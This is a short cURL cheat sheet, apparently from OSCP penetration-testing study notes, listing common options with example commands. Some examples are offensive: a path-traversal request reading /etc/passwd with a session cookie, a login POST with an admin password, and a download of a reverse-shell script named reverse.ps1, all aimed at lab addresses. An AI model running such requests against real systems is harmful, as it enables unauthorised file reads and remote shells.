# Common Options
|   |   |
|---|---|
|`-L, --location`|Redo the request on the new location if the server reports that the requested page has moved to a different location (i.e. follow redirection)|
|`-k, --insecure`|Proceed even if connection is insecure (i.e. ignore certificate errors|
|`-o, --output <file>`|Write output to <file> instead of stdout|
|`-O, --remote-name`|Write output to a local file named like the remote file we get|
|`-H, --header <header/@file>`|Header to include in the request when sending HTTP to a server<br>e.g. `-H 'Content-Type:application/x-www-form-urlencoded'`, `-H 'Content-Type:multipart/form-data'`|
|`-b, --cookie <data\|filename>`|Pass the data to the HTTP server in the Cookie header, format: `-b 'NAME1=VALUE1;NAME2=VALUE2'`|
|`-X, --request <command>`|Specify custom request method to use, defaults to `GET`, e.g. `-X POST`|
|`-v, --verbose`|Makes cURL verbose, shows request headers + response headers + content data|
|`-i, --include`|Include the response headers, but not response headers|
|`-I, --head`|Fetch the headers only|

## Examples

### Login and follow redirection after login

```console
curl -L -H 'Content-Type:application/x-www-form-urlencoded' -X POST -d 'username=admin&password=transorbital1' -v http://10.0.88.33/manage.php
```

### Use a session cookie for the request

```console
curl -b PHPSESSID=7lta0l401mm57sh8h63ttrbb9g -v http://10.0.88.33/manage.php/manage.php?file=../../../../etc/passwd
```

### Download a file (follow redirections, save file as remote name)

```console
curl -LO https://github.com/joetanx/oscp/raw/main/reverse.ps1
```

### Upload a file

```console
curl -H 'Content-Type:multipart/form-data' -X POST -F file=@"The Little Prince.jpg" -v http://kali.vx/upload.php
```

# References
<https://manpages.debian.org/bullseye/curl/curl.1.en.html>
<https://reqbin.com/req/c-bjcj04uw/curl-send-cookies-example>
<https://reqbin.com/req/c-sma2qrvp/curl-post-form-example>
